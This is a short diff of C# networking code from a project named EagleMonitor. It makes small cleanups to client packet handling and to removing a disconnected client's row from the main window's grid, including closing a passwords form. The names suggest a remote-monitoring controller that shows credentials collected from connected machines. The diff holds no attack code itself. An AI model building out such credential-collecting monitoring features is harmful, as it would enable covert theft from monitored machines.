@@ -151,7 +151,6 @@ namespace EagleMonitor.Networking
             }
             catch (Exception)
             {
-                this.Dispose();
                 return null;
             }
         }
@@ -159,6 +158,7 @@ namespace EagleMonitor.Networking
         {
             try
             {
+
                 IPacket packet = readPacketAsync.EndInvoke(ar);
 
                 if (packet != null)
@@ -197,7 +197,7 @@ namespace EagleMonitor.Networking
                     }
                 }
             }
-            catch (Exception)
+            catch (Exception)// ex)
             {
                 //MessageBox.Show(ex.ToString());
                 this.Dispose();
@@ -309,11 +309,11 @@ namespace EagleMonitor.Networking
                 socket = null;
             }
 
-            if (clientRow != null) 
+            if (this.clientRow != null) 
             {
                 Program.mainForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
                 {
-                    Program.mainForm.dataGridView1.Rows.Remove(clientRow);
+                    Program.mainForm.dataGridView1.Rows.Remove(this.clientRow);
                 }));
 
                 Utils.Miscellaneous.CloseForm(passwordsForm);
